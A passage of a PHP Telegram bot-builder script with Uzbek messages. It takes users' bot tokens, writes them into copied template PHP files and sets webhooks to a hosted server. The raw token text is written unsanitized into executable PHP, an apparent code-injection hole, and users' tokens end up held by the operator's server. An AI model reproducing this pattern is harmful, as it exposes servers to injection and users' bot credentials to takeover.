    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//ishladi
if($text=="➕Kalkulyator➖"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /calc 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/calc")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/calc.php");
    file_put_contents("baza/$uid/calc.php", file_get_contents("calc.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/calc.php"));
    file_put_contents("baza/$uid/calc.php", "$savet");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/calc.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
if($text=="🌀GIF Maker🌀"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /gif 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/gif")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/gif.php");
    file_put_contents("baza/$uid/gif.php", file_get_contents("gif.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/gif.php"));
    file_put_contents("baza/$uid/gif.php", "$savet");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/gif.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}

if($text=="♥️Instagram♥️"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /insta 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/insta")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/instagram.php");
    file_put_contents("baza/$uid/instagram.php", file_get_contents("instagram.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/instagram.php"));
    file_put_contents("baza/$uid/instagram.php", "$savet");
	    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/elikbot.php"));
    file_put_contents("baza/$uid/elikbot.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/instagram.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}

if($text=="🧠IQ Test📋"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /IQ 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/IQ")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/IQ.php");
    file_put_contents("baza/$uid/IQ.php", file_get_contents("IQ.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/IQ.php"));
    file_put_contents("baza/$uid/IQ.php", "$savet");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/IQ.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}

if($text=="↪️Konvertor↩️"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /konvertor 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/konvertor")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/konvertor.php");
    file_put_contents("baza/$uid/konvertor.php", file_get_contents("konvertor.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/konvertor.php"));
    file_put_contents("baza/$uid/konvertor.php", "$savet");
	    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/elikbot.php"));
    file_put_contents("baza/$uid/elikbot.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/konvertor.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//Ishladi
if($text=="🗨Matni Yashirish🗨"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /matn 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0
   Inlineni yoqing!",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/matn")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/matnniyashirish.php");
    file_put_contents("baza/$uid/matnniyashirish.php", file_get_contents("matnniyashirish.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/matnniyashirish.php"));
    file_put_contents("baza/$uid/matnniyashirish.php", "$savet");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/matnniyashirish.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//Ishladi
if($text=="🎼Musiqa Editor🎹"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /muzeditor 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/muzeditor")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/musiqaeditor.php");
    file_put_contents("baza/$uid/musiqaeditor.php", file_get_contents("musiqaeditor.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/musiqaeditor.php"));
    file_put_contents("baza/$uid/musiqaeditor.php", "$savet");
	    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/elikbot.php"));
    file_put_contents("baza/$uid/elikbot.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/musiqaeditor.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}

if($text=="👜Play Market🛒"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /play 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/play")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/playm.php");
    file_put_contents("baza/$uid/playm.php", file_get_contents("playm.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/playm.php"));
    file_put_contents("baza/$uid/playm.php", "$savet");
	    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/elikbot.php"));
    file_put_contents("baza/$uid/elikbot.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/playm.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//Ishladi
if($text=="ℹ️Profil Infoℹ️"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /profil 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/profil")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/profilinfo.php");
    file_put_contents("baza/$uid/profilinfo.php", file_get_contents("profilinfo.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/profilinfo.php"));
    file_put_contents("baza/$uid/profilinfo.php", "$savet");
	    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/elikbot.php"));
    file_put_contents("baza/$uid/elikbot.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/profilinfo.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//ishladi
if($text=="🕌Quron🕌"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /quran 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/quran")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/quran.php");
    file_put_contents("baza/$uid/quran.php", file_get_contents("quran.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/quran.php"));
    file_put_contents("baza/$uid/quran.php", "$savet");
	    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/elikbot.php"));
    file_put_contents("baza/$uid/elikbot.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/quran.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}

if($text=="💂‍♂️Qo'riqchi💂‍♂️"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /quriqchi 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/quriqchi")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/quriqchi.php");
    file_put_contents("baza/$uid/quriqchi.php", file_get_contents("quriqchi.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/quriqchi.php"));
    file_put_contents("baza/$uid/quriqchi.php", "$savet");
	    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/elikbot.php"));
    file_put_contents("baza/$uid/elikbot.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/quriqchi.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//Ishladi
if($text=="📋Savol-Javob🖋"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /savol 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/savol")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/savol.php");
    file_put_contents("baza/$uid/savol.php", file_get_contents("savol.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/savol.php"));
    file_put_contents("baza/$uid/savol.php", "$savet");
	    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/elikbot.php"));
    file_put_contents("baza/$uid/elikbot.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/savol.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//Ishladi lekin boshqa narsa logo suz
if($text=="🎆Logo So'zlar🅰️"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /logos 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/logos")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/sevgitesti.php");
    file_put_contents("baza/$uid/sevgitesti.php", file_get_contents("sevgitesti.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/sevgitesti.php"));
    file_put_contents("baza/$uid/sevgitesti.php", "$savet");
	    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/elikbot.php"));
    file_put_contents("baza/$uid/elikbot.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/sevgitesti.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//ISHLADI
if($text=="💬Tarjimon🔄"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /tarjimon 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/tarjimon")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/tarjimon.php");
    file_put_contents("baza/$uid/tarjimon.php", file_get_contents("tarjimon.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/tarjimon.php"));
    file_put_contents("baza/$uid/tarjimon.php", "$savet");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/tarjimon.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//Ishladi
if($text=="💎Money🤑"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /money 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/money")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
	    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
    $clone=file_get_contents("baza/$uid/money.php");
    file_put_contents("baza/$uid/money.php", file_get_contents("money.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/money.php"));
    file_put_contents("baza/$uid/money.php", "$savet");
		    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/money.php"));
    file_put_contents("baza/$uid/money.php", "$savea");
			$saveb =  str_replace("API_BOT", "$botus", file_get_contents("baza/$uid/money.php"));
    file_put_contents("baza/$uid/money.php", "$saveb");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/money.php");
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//ISHLADI
if($text=="👑KING Money💰"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /kmoney 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/kmoney")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
	    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
    $clone=file_get_contents("baza/$uid/kmoney.php");
    file_put_contents("baza/$uid/kmoney.php", file_get_contents("kmoney.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/kmoney.php"));
    file_put_contents("baza/$uid/kmoney.php", "$savet");
		    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/kmoney.php"));
    file_put_contents("baza/$uid/kmoney.php", "$savea");
				$saveb =  str_replace("API_BOT", "$botus", file_get_contents("baza/$uid/kmoney.php"));
    file_put_contents("baza/$uid/kmoney.php", "$saveb");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/kmoney.php");

bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//IShladi
if($text=="👾TG VEKTOR🔐"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /vektor 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/vektor")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
	    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
    $clone=file_get_contents("baza/$uid/vektor.php");
    file_put_contents("baza/$uid/vektor.php", file_get_contents("vektor.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/vektor.php"));
    file_put_contents("baza/$uid/vektor.php", "$savet");
		    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/vektor.php"));
    file_put_contents("baza/$uid/vektor.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/vektor.php");

bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//ISHLADI
if($text=="💋Nozimaxonim💝"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /nozima 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/nozima")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
	    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
    $clone=file_get_contents("baza/$uid/nozima.php");
    file_put_contents("baza/$uid/nozima.php", file_get_contents("nozima.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/nozima.php"));
    file_put_contents("baza/$uid/nozima.php", "$savet");
		    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/nozima.php"));
    file_put_contents("baza/$uid/nozima.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/nozima.php");

bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//ISHLADI
if($text=="🔧Konstruktor🏗"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /konstrukt 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/konstrukt")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
	    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
    $clone=file_get_contents("baza/$uid/konstrukt.php");
    file_put_contents("baza/$uid/konstrukt.php", file_get_contents("konstrukt.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/konstrukt.php"));
    file_put_contents("baza/$uid/konstrukt.php", "$savet");
		    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/konstrukt.php"));
    file_put_contents("baza/$uid/konstrukt.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/konstrukt.php");

bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//
if($text=="🔰VIP GR🔰"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /vip 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/vip")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
	    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
    $clone=file_get_contents("baza/$uid/vip.php");
    file_put_contents("baza/$uid/vip.php", file_get_contents("vip.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/vip.php"));
    file_put_contents("baza/$uid/vip.php", "$savet");
    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/vip.php"));
    file_put_contents("baza/$uid/vip.php", "$savea");
	$saveb =  str_replace("API_BOT", "$botus", file_get_contents("baza/$uid/vip.php"));
    file_put_contents("baza/$uid/vip.php", "$saveb");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/vip.php");

bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//ishladi
if($text=="Ⓜ️MEGA BOT🌐"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /mega 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0
   Inlineni yoqing!",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/mega")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
	    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
    $clone=file_get_contents("baza/$uid/mega.php");
    file_put_contents("baza/$uid/mega.php", file_get_contents("mega.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/mega.php"));
    file_put_contents("baza/$uid/mega.php", "$savet");
    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/mega.php"));
    file_put_contents("baza/$uid/mega.php", "$savea");
	$saveb =  str_replace("API_BOT", "$botus", file_get_contents("baza/$uid/mega.php"));
    file_put_contents("baza/$uid/mega.php", "$saveb");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/mega.php");

bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//ISHLADI
if($text=="🎃DaySandBox🎃"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /daysandbox 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/daysandbox")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
	    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
    $clone=file_get_contents("baza/$uid/daysanbox.php");
    file_put_contents("baza/$uid/daysanbox.php", file_get_contents("daysanbox.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/daysanbox.php"));
    file_put_contents("baza/$uid/daysanbox.php", "$savet");
    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/daysanbox.php"));
    file_put_contents("baza/$uid/daysanbox.php", "$savea");
	$saveb =  str_replace("API_BOT", "$botus", file_get_contents("baza/$uid/daysanbox.php"));
    file_put_contents("baza/$uid/daysanbox.php", "$saveb");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/daysanbox.php");

bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//ISHLADI
if($text=="💬Text to Golos🔊"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /textgolos 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/textgolos")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
	    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
    $clone=file_get_contents("baza/$uid/voice.php");
